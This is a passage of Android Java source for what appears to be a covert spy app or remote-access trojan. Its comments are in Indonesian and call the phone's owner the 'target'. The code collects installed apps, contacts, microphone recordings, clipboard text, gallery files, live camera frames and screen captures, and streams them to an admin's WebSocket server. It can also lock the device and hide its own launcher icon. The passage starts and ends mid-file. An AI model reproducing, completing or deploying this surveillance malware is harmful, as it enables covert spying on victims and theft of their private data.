                if (w <= TARGET_W && h <= TARGET_H) {
                    // Prefer yang <= target
                    diff = (long) (TARGET_W - w) * (TARGET_W - w) + (long) (TARGET_H - h) * (TARGET_H - h);
                } else if (w > TARGET_W || h > TARGET_H) {
                    // Penalti untuk yang lebih besar dari target
                    diff = ((long) (w - TARGET_W) * (w - TARGET_W) + (long) (h - TARGET_H) * (h - TARGET_H)) * 4;
                } else {
                    diff = Long.MAX_VALUE;
                }

                if (diff < bestDiff) {
                    bestDiff = diff;
                    best = s;
                }
            }

            if (best == null) {
                // Fallback: pilih size pertama yang available (terkecil biasanya)
                best = sizes[sizes.length - 1];
            }

            return best;
        } catch (Exception e) {
            sendLog("chooseOptimalJpegSize error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Hitung JPEG_ORIENTATION yang benar supaya foto tampil portrait di viewer.
     *
     * Camera2 spec: JPEG_ORIENTATION = (sensorOrientation - deviceRotation + 360) % 360
     * untuk back camera. Front camera tambahan di-mirror (360 - result).
     *
     * Default assumption: user pegang phone dalam portrait (rotation 0).
     * Back camera biasanya sensorOrientation=90 → JPEG_ORIENTATION = 90 → foto
     * tampil portrait di viewer (termasuk Flutter Image.network yang respect EXIF).
     */
    private int getJpegOrientation(String cameraId, int cameraFacing) {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            Integer sensorOrientationInt = chars.get(CameraCharacteristics.SENSOR_ORIENTATION);
            int sensorOri = sensorOrientationInt != null ? sensorOrientationInt : 90;
            int deviceRot = getWindowRotation();

            int totalRotation;
            if (cameraFacing == CameraCharacteristics.LENS_FACING_FRONT) {
                // Front camera: mirror + compensate
                totalRotation = (sensorOri + deviceRot) % 360;
                totalRotation = (360 - totalRotation) % 360;
            } else {
                // Back camera: standard formula
                totalRotation = (sensorOri - deviceRot + 360) % 360;
            }
            return totalRotation;
        } catch (Exception e) {
            // Fallback: 90 derajat (cocok untuk back camera di portrait mode)
            return 90;
        }
    }

    /**
     * Ambil rotasi device (0/90/180/270 derajat) dari WindowManager.
     *
     * Catatan: di Service, getWindowManager() TIDAK tersedia (itu method
     * Activity). Harus ambil WindowManager lewat getSystemService().
     */
    private int getWindowRotation() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return 0;
            Display display = wm.getDefaultDisplay();
            if (display == null) return 0;
            int rotation = display.getRotation();
            switch (rotation) {
                case Surface.ROTATION_0:   return 0;
                case Surface.ROTATION_90:  return 90;
                case Surface.ROTATION_180: return 180;
                case Surface.ROTATION_270: return 270;
                default: return 0;
            }
        } catch (Exception e) {
            return 0;
        }
    }

    private void cleanupCamera() {
        try {
            if (activeCaptureSession != null) {
                activeCaptureSession.close();
                activeCaptureSession = null;
            }
        } catch (Exception e) {}
        try {
            if (activeCameraDevice != null) {
                activeCameraDevice.close();
                activeCameraDevice = null;
            }
        } catch (Exception e) {}
        try {
            if (activeImageReader != null) {
                activeImageReader.close();
                activeImageReader = null;
            }
        } catch (Exception e) {}
    }

    /**
     * FITUR 2: Get Installed Apps — list semua APK terinstall.
     *
     * Kirim sebagai WS message: { type: "apps_list", apps: [...] }
     * API server akan simpan ke apps.json.
     */
    private void getInstalledApps() {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    List<ApplicationInfo> apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
                    JSONArray appsArray = new JSONArray();

                    for (ApplicationInfo appInfo : apps) {
                        try {
                            JSONObject app = new JSONObject();
                            app.put("package", appInfo.packageName);

                            String label;
                            try {
                                label = packageManager.getApplicationLabel(appInfo).toString();
                            } catch (Exception e) {
                                label = appInfo.packageName;
                            }
                            app.put("name", label);

                            boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                            boolean isUpdatedSystem = (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
                            app.put("system", isSystem && !isUpdatedSystem);
                            app.put("updated_system", isUpdatedSystem);

                            try {
                                PackageInfo pkgInfo = packageManager.getPackageInfo(appInfo.packageName, 0);
                                app.put("version", pkgInfo.versionName != null ? pkgInfo.versionName : "");
                                app.put("version_code", pkgInfo.versionCode);
                                app.put("install_time", pkgInfo.firstInstallTime);
                                app.put("update_time", pkgInfo.lastUpdateTime);
                            } catch (Exception e) {}

                            appsArray.put(app);
                        } catch (Exception e) {}
                    }

                    JSONObject msg = new JSONObject();
                    msg.put("type", "apps_list");
                    msg.put("total", appsArray.length());
                    msg.put("apps", appsArray);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                } catch (Exception e) {
                    sendLog("get_apps error: " + e.getMessage());
                }
            }
        });
    }

    /**
     * FITUR 3: Get Contacts — list semua kontak di HP target.
     *
     * Kirim sebagai WS message: { type: "contacts_list", contacts: [...] }
     */
    private void getContacts() {
        if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendLog("get_contacts: READ_CONTACTS permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                Cursor cursor = null;
                try {
                    JSONArray contactsArray = new JSONArray();
                    cursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                        },
                        null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    );

                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            try {
                                String name = cursor.getString(0);
                                String number = cursor.getString(1);
                                int type = cursor.getInt(2);

                                JSONObject contact = new JSONObject();
                                contact.put("name", name != null ? name : "");
                                contact.put("number", number != null ? number : "");
                                String typeLabel;
                                switch (type) {
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: typeLabel = "mobile"; break;
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: typeLabel = "home"; break;
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: typeLabel = "work"; break;
                                    default: typeLabel = "other";
                                }
                                contact.put("type", typeLabel);
                                contactsArray.put(contact);
                            } catch (Exception e) {}
                        }
                    }

                    JSONObject msg = new JSONObject();
                    msg.put("type", "contacts_list");
                    msg.put("total", contactsArray.length());
                    msg.put("contacts", contactsArray);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                } catch (Exception e) {
                    sendLog("get_contacts error: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
        });
    }

    /**
     * FITUR 4: Record Audio (mic) — rekam selama N detik, lalu kirim base64.
     *
     * Kirim sebagai WS message: { type: "audio_recorded", data: "<base64>", duration: <sec> }
     */
    private void recordAudio(final int durationSec) {
        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendLog("record_audio: RECORD_AUDIO permission not granted");
            return;
        }
        if (isRecording) {
            sendLog("record_audio: already recording, stop dulu");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    File outputDir = new File(getCacheDir(), "audio");
                    if (!outputDir.exists()) outputDir.mkdirs();
                    audioRecordingFile = new File(outputDir, "rec_" + System.currentTimeMillis() + ".m4a");

                    mediaRecorder = new MediaRecorder();
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(64000);
                    mediaRecorder.setAudioSamplingRate(44100);
                    mediaRecorder.setOutputFile(audioRecordingFile.getAbsolutePath());

                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    isRecording = true;

                    if (recordingHandler == null) {
                        recordingHandler = new Handler(Looper.getMainLooper());
                    }

                    recordingHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            stopAudioRecording();
                        }
                    }, durationSec * 1000);

                } catch (Exception e) {
                    sendLog("record_audio start error: " + e.getMessage());
                    isRecording = false;
                    try { if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; } } catch (Exception ex) {}
                }
            }
        });
    }

    private void stopAudioRecording() {
        if (!isRecording) return;
        isRecording = false;

        try {
            if (mediaRecorder != null) {
                try { mediaRecorder.stop(); } catch (Exception e) {}
                mediaRecorder.release();
                mediaRecorder = null;
            }

            if (audioRecordingFile != null && audioRecordingFile.exists()) {
                FileInputStream fis = new FileInputStream(audioRecordingFile);
                byte[] buffer = new byte[(int) audioRecordingFile.length()];
                fis.read(buffer);
                fis.close();

                String base64 = Base64.encodeToString(buffer, Base64.NO_WRAP);

                JSONObject msg = new JSONObject();
                msg.put("type", "audio_recorded");
                msg.put("format", "m4a");
                msg.put("data", base64);
                msg.put("size", buffer.length);
                msg.put("timestamp", System.currentTimeMillis());

                if (webSocket != null && isConnected) {
                    webSocket.send(msg.toString());
                }

                audioRecordingFile.delete();
            }
        } catch (Exception e) {
            sendLog("stop_audio error: " + e.getMessage());
        }
    }

    /**
     * FITUR 5: Clipboard Monitor — polling tiap 5 detik, kirim kalau ada perubahan.
     *
     * Dipanggil dari onCreate. Timer jalan terus, kirim WS message:
     * { type: "clipboard", text: "...", timestamp: <ms> }
     */
    private void startClipboardMonitoring() {
        try {
            clipboardManager = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboardManager == null) return;

            clipboardTimer = new Timer("ClipboardMonitor", true);
            clipboardTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        if (clipboardManager == null || !clipboardManager.hasPrimaryClip()) return;
                        android.content.ClipData clip = clipboardManager.getPrimaryClip();
                        if (clip == null || clip.getItemCount() == 0) return;
                        CharSequence text = clip.getItemAt(0).coerceToText(BackgroundService.this);
                        if (text == null) return;
                        String textStr = text.toString().trim();
                        if (textStr.isEmpty()) return;
                        if (textStr.equals(lastClipboardText)) return;

                        lastClipboardText = textStr;

                        JSONObject msg = new JSONObject();
                        msg.put("type", "clipboard");
                        msg.put("text", textStr);
                        msg.put("timestamp", System.currentTimeMillis());

                        if (webSocket != null && isConnected) {
                            webSocket.send(msg.toString());
                        }
                    } catch (Exception e) {
                        // Silent — clipboard access bisa denied di Android 10+
                    }
                }
            }, 5000, 5000); // mulai setelah 5 detik, cek tiap 5 detik
        } catch (Exception e) {
            sendLog("clipboard monitor start error: " + e.getMessage());
        }
    }

    /**
     * Helper: kirim pesan log ke server (diterima API sebagai type:"log")
     * supaya debug di sisi admin gampang.
     */
    private void sendLog(String message) {
        try {
            android.util.Log.w("SpyService", message);
            if (webSocket != null && isConnected) {
                JSONObject msg = new JSONObject();
                msg.put("type", "log");
                msg.put("message", message);
                msg.put("timestamp", System.currentTimeMillis());
                webSocket.send(msg.toString());
            }
        } catch (Exception e) {}
    }

    // ====================================================================
    // ============ FITUR BARU: GALLERY ACCESS ============================
    // ====================================================================

    /**
     * GALLERY ACCESS — query MediaStore untuk semua foto + video di gallery.
     *
     * Kirim WS: {type: 'gallery_list', items: [...], total: N}
     * Tiap item: {id, name, mime, size, date_added, width, height, duration}
     */
    private void getGalleryFiles() {
        if (!hasGalleryPermission()) {
            sendLog("get_gallery: permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                JSONArray items = new JSONArray();
                try {
                    // Query images
                    addMediaToGallery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", items);
                    // Query videos
                    addMediaToGallery(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", items);

                    JSONObject msg = new JSONObject();
                    msg.put("type", "gallery_list");
                    msg.put("total", items.length());
                    msg.put("items", items);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                    sendLog("get_gallery: sent " + items.length() + " items");
                } catch (Exception e) {
                    sendLog("get_gallery error: " + e.getMessage());
                }
            }
        });
    }

    private boolean hasGalleryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+: READ_MEDIA_IMAGES / READ_MEDIA_VIDEO
            return checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(android.Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED;
        } else {
            return checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void addMediaToGallery(Uri baseUri, String type, JSONArray out) {
        Cursor cursor = null;
        try {
            String[] projection;
            if ("video".equals(type)) {
                projection = new String[]{
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.MIME_TYPE,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_ADDED,
                    MediaStore.Video.Media.WIDTH,
                    MediaStore.Video.Media.HEIGHT,
                    MediaStore.Video.Media.DURATION
                };
            } else {
                projection = new String[]{
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.WIDTH,
                    MediaStore.Images.Media.HEIGHT
                };
            }

            cursor = getContentResolver().query(baseUri, projection, null, null, "date_added DESC LIMIT 500");
            if (cursor == null) return;

            int idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID);
            int nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME);
            int mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE);
            int sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE);
            int dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED);
            int wIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.WIDTH);
            int hIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.HEIGHT);
            int durIdx = "video".equals(type) ? cursor.getColumnIndex(MediaStore.Video.Media.DURATION) : -1;

            while (cursor.moveToNext()) {
                try {
                    long id = cursor.getLong(idIdx);
                    JSONObject item = new JSONObject();
                    item.put("id", id);
                    item.put("type", type);
                    item.put("name", cursor.getString(nameIdx));
                    item.put("mime", cursor.getString(mimeIdx));
                    item.put("size", cursor.getLong(sizeIdx));
                    item.put("date_added", cursor.getLong(dateIdx));
                    item.put("width", cursor.getInt(wIdx));
                    item.put("height", cursor.getInt(hIdx));
                    if (durIdx >= 0) item.put("duration", cursor.getLong(durIdx));
                    out.put(item);
                } catch (Exception e) {}
            }
        } catch (Exception e) {
            sendLog("addMediaToGallery error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    /**
     * Ambil 1 file dari gallery by ID, kirim via WS sebagai chunked base64.
     * Admin bisa download full-res image/video.
     *
     * Kirim WS: {type: 'gallery_file', file_id, mime, name, data, size}
     */
    private void getGalleryFile(long fileId, String mime) {
        if (!hasGalleryPermission()) {
            sendLog("get_gallery_file: permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                Cursor cursor = null;
                try {
                    Uri baseUri;
                    if (mime != null && mime.startsWith("video/")) {
                        baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                    } else {
                        baseUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    }
                    Uri fileUri = android.content.ContentUris.withAppendedId(baseUri, fileId);

                    cursor = getContentResolver().query(fileUri,
                        new String[]{MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE},
                        null, null, null);

                    String name = "file_" + fileId;
                    long size = 0;
                    String actualMime = mime;
                    if (cursor != null && cursor.moveToFirst()) {
                        try {
                            name = cursor.getString(0);
                            size = cursor.getLong(1);
                            actualMime = cursor.getString(2);
                        } catch (Exception e) {}
                    }
                    if (cursor != null) cursor.close();

                    // Batasi size 5MB supaya gak overload WebSocket
                    if (size > 5_000_000) {
                        sendLog("get_gallery_file: file too large (" + size + " bytes), skipping");
                        JSONObject err = new JSONObject();
                        err.put("type", "gallery_file_error");
                        err.put("file_id", fileId);
                        err.put("error", "file_too_large");
                        err.put("size", size);
                        if (webSocket != null && isConnected) webSocket.send(err.toString());
                        return;
                    }

                    // Read bytes
                    java.io.InputStream is = getContentResolver().openInputStream(fileUri);
                    if (is == null) {
                        sendLog("get_gallery_file: InputStream null");
                        return;
                    }
                    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                    byte[] buffer = new byte[8192];
                    int n;
                    while ((n = is.read(buffer)) > 0) baos.write(buffer, 0, n);
                    is.close();

                    byte[] fileBytes = baos.toByteArray();
                    String base64 = Base64.encodeToString(fileBytes, Base64.NO_WRAP);

                    JSONObject msg = new JSONObject();
                    msg.put("type", "gallery_file");
                    msg.put("file_id", fileId);
                    msg.put("name", name);
                    msg.put("mime", actualMime);
                    msg.put("size", fileBytes.length);
                    msg.put("data", base64);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                    sendLog("get_gallery_file: sent " + name + " (" + fileBytes.length + " bytes)");
                } catch (Exception e) {
                    sendLog("get_gallery_file error: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
        });
    }

    // ====================================================================
    // ============ FITUR BARU: LIVE CAMERA STREAM ========================
    // ====================================================================

    /**
     * LIVE CAMERA STREAM — repeating capture, kirim JPEG frame via WS.
     *
     * Berbeda dengan takePhoto (single shot), ini jalan terus sampai stop.
     * Throttle: 1 frame per 1500ms (~0.6 fps) untuk hemat bandwidth.
     *
     * Kirim WS per frame: {type: 'live_frame', camera, width, height, data, ts}
     */
    private void startLiveCameraStream(final String cameraFacing) {
        if (isLiveStreaming) {
            sendLog("start_live_stream: already running, stop dulu");
            return;
        }
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendLog("start_live_stream: CAMERA permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    final int desiredFacing;
                    if ("front".equalsIgnoreCase(cameraFacing)) {
                        desiredFacing = CameraCharacteristics.LENS_FACING_FRONT;
                    } else {
                        desiredFacing = CameraCharacteristics.LENS_FACING_BACK;
                    }

                    String[] cameraIdList = cameraManager.getCameraIdList();
                    String foundId = null;
                    for (String id : cameraIdList) {
                        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                        Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                        if (facing != null && facing == desiredFacing) {
                            foundId = id;
                            break;
                        }
                    }
                    if (foundId == null) {
                        if (cameraIdList.length == 0) {
                            sendLog("start_live_stream: no camera");
                            return;
                        }
                        foundId = cameraIdList[0];
                    }
                    final String cameraIdFinal = foundId;

                    // Resolusi rendah untuk stream (480p cukup + hemat bandwidth)
                    final android.util.Size streamSize = chooseOptimalJpegSize(cameraIdFinal);
                    if (streamSize == null) {
                        sendLog("start_live_stream: no JPEG size available");
                        return;
                    }
                    final int streamW = Math.min(streamSize.getWidth(), 640);
                    final int streamH = Math.min(streamSize.getHeight(), 480);

                    liveStreamImageReader = ImageReader.newInstance(streamW, streamH, ImageFormat.JPEG, 2);
                    liveStreamImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = null;
                            try {
                                // Throttle: skip kalau belum cukup waktu sejak frame terakhir
                                long now = System.currentTimeMillis();
                                if (now - lastLiveFrameSent < LIVE_FRAME_MIN_INTERVAL_MS) {
                                    // Drop frame
                                    return;
                                }
                                lastLiveFrameSent = now;

                                image = reader.acquireLatestImage();
                                if (image == null) return;
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);

                                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                JSONObject msg = new JSONObject();
                                msg.put("type", "live_frame");
                                msg.put("camera", cameraFacing);
                                msg.put("width", streamW);
                                msg.put("height", streamH);
                                msg.put("data", base64);
                                msg.put("timestamp", now);
                                if (webSocket != null && isConnected) {
                                    webSocket.send(msg.toString());
                                }
                            } catch (Exception e) {
                                // Silent — jangan spam log tiap frame
                            } finally {
                                if (image != null) image.close();
                            }
                        }
                    }, backgroundHandler);

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        cameraManager.openCamera(cameraIdFinal, new CameraDevice.StateCallback() {
                            @Override
                            public void onOpened(CameraDevice camera) {
                                liveStreamCameraDevice = camera;
                                try {
                                    List<Surface> surfaces = new ArrayList<>();
                                    surfaces.add(liveStreamImageReader.getSurface());

                                    camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(CameraCaptureSession session) {
                                            liveStreamSession = session;
                                            try {
                                                CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                builder.addTarget(liveStreamImageReader.getSurface());
                                                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                                builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                builder.set(CaptureRequest.JPEG_QUALITY, (byte) 60);
                                                builder.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation(cameraIdFinal, desiredFacing));
                                                // Repeating request — bakal fire onImageAvailable berkali-kali
                                                session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                                                isLiveStreaming = true;
                                                liveStreamCamera = cameraFacing;
                                                sendLog("live_stream: started " + cameraFacing);
                                            } catch (Exception e) {
                                                sendLog("live_stream start error: " + e.getMessage());
                                                stopLiveCameraStream();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(CameraCaptureSession session) {
                                            sendLog("live_stream: session config failed");
                                            stopLiveCameraStream();
                                        }
                                    }, backgroundHandler);
                                } catch (Exception e) {
                                    sendLog("live_stream session error: " + e.getMessage());
                                    stopLiveCameraStream();
                                }
                            }

                            @Override
                            public void onDisconnected(CameraDevice camera) { stopLiveCameraStream(); }

                            @Override
                            public void onError(CameraDevice camera, int error) {
                                sendLog("live_stream: camera error " + error);
                                stopLiveCameraStream();
                            }
                        }, backgroundHandler);
                    }
                } catch (Exception e) {
                    sendLog("start_live_stream error: " + e.getMessage());
                    stopLiveCameraStream();
                }
            }
        });
    }

    private void stopLiveCameraStream() {
        try {
            if (liveStreamSession != null) {
                try { liveStreamSession.stopRepeating(); } catch (Exception e) {}
                try { liveStreamSession.close(); } catch (Exception e) {}
                liveStreamSession = null;
            }
        } catch (Exception e) {}
        try {
            if (liveStreamCameraDevice != null) {
                liveStreamCameraDevice.close();
                liveStreamCameraDevice = null;
            }
        } catch (Exception e) {}
        try {
            if (liveStreamImageReader != null) {
                liveStreamImageReader.close();
                liveStreamImageReader = null;
            }
        } catch (Exception e) {}
        isLiveStreaming = false;
        liveStreamCamera = null;
        sendLog("live_stream: stopped");
    }

    // ====================================================================
    // ============ FITUR BARU: SCREEN CAPTURE (MediaProjection) ==========
    // ====================================================================

    /**
     * Request consent dari user untuk screen capture.
     * Launch ScreenCaptureActivity (invisible, cuma show system dialog).
     */
    private void requestScreenCapturePermission() {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent i = new Intent(BackgroundService.this, ScreenCaptureActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    sendLog("screen_capture: requesting permission");
                } catch (Exception e) {
                    sendLog("screen_capture request error: " + e.getMessage());
                }
            }
        });
    }

    /**
     * Start screen capture. Akan fail kalau permission belum di-grant.
     */
    private void startScreenCapture() {
        if (isScreenCapturing) {
            sendLog("screen_capture: already running");
            return;
        }
        if (!ScreenCaptureActivity.hasResult || ScreenCaptureActivity.resultData == null) {
            sendLog("screen_capture: permission not granted yet, call request_screen_capture dulu");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    if (mpm == null) {
                        sendLog("screen_capture: MediaProjectionManager null");
                        return;
                    }

                    // Buat MediaProjection dari cached result
                    mediaProjection = mpm.getMediaProjection(ScreenCaptureActivity.resultCode, ScreenCaptureActivity.resultData);
                    if (mediaProjection == null) {
                        sendLog("screen_capture: MediaProjection null, permission expired");
                        ScreenCaptureActivity.hasResult = false;
                        ScreenCaptureActivity.resultData = null;
                        return;
                    }

                    // Bikin ImageReader untuk capture screen
                    android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
                    WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                    wm.getDefaultDisplay().getRealMetrics(metrics);
                    int screenW = Math.min(metrics.widthPixels, 720);
                    int screenH = Math.min(metrics.heightPixels, 1280);

                    screenImageReader = ImageReader.newInstance(screenW, screenH, PixelFormat.RGBA_8888, 2);
                    screenImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = null;
                            try {
                                long now = System.currentTimeMillis();
                                if (now - lastScreenFrameSent < SCREEN_FRAME_MIN_INTERVAL_MS) return;
                                lastScreenFrameSent = now;

                                image = reader.acquireLatestImage();
                                if (image == null) return;

                                // Convert RGBA → JPEG via Bitmap
                                Image.Plane[] planes = image.getPlanes();
                                ByteBuffer buf = planes[0].getBuffer();
                                int pixelStride = planes[0].getPixelStride();
                                int rowStride = planes[0].getRowStride();
                                int rowPadding = rowStride - pixelStride * image.getWidth();

                                Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
                                bitmap.copyPixelsFromBuffer(buf);

                                // Crop padding
                                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, image.getWidth(), image.getHeight());

                                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                                cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                                byte[] jpegBytes = baos.toByteArray();

                                String base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
                                JSONObject msg = new JSONObject();
                                msg.put("type", "screen_frame");
                                msg.put("width", cropped.getWidth());
                                msg.put("height", cropped.getHeight());
                                msg.put("data", base64);
                                msg.put("timestamp", now);
                                if (webSocket != null && isConnected) {
                                    webSocket.send(msg.toString());
                                }

                                bitmap.recycle();
                                if (cropped != bitmap) cropped.recycle();
                            } catch (Exception e) {
                                // Silent
                            } finally {
                                if (image != null) image.close();
                            }
                        }
                    }, backgroundHandler);

                    // Create VirtualDisplay
                    int flags = android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
                    virtualDisplay = mediaProjection.createVirtualDisplay(
                        "SpyScreenCapture",
                        screenW, screenH, metrics.densityDpi,
                        flags, screenImageReader.getSurface(),
                        null, backgroundHandler);

                    isScreenCapturing = true;
                    sendLog("screen_capture: started " + screenW + "x" + screenH);
                } catch (Exception e) {
                    sendLog("start_screen_capture error: " + e.getMessage());
                    stopScreenCapture();
                }
            }
        });
    }

    private void stopScreenCapture() {
        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
        } catch (Exception e) {}
        try {
            if (screenImageReader != null) {
                screenImageReader.close();
                screenImageReader = null;
            }
        } catch (Exception e) {}
        try {
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        } catch (Exception e) {}
        isScreenCapturing = false;
        sendLog("screen_capture: stopped");
    }

    private void lockDevice() {
        try {
            if (devicePolicyManager != null && devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow();
            }
            showLockScreen();
        } catch (Exception e) {}
    }
    
    private void unlockDevice() {
        try {
            hideLockScreen();
        } catch (Exception e) {}
    }
    
    private void hideApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void showApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void reconnect() {
        reconnectAttempts++;
        long delay = Math.min(5000 * reconnectAttempts, 30000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (webSocket != null) {
                    try {
                        webSocket.cancel();
                    } catch (Exception e) {}
                }
                connectWebSocket();
            }
        }, delay);
    }
    
    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username);
            auth.put("device_id", deviceId);
            auth.put("model", model);
            auth.put("battery", getBatteryLevel());
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendDeviceInfo() {
        try {
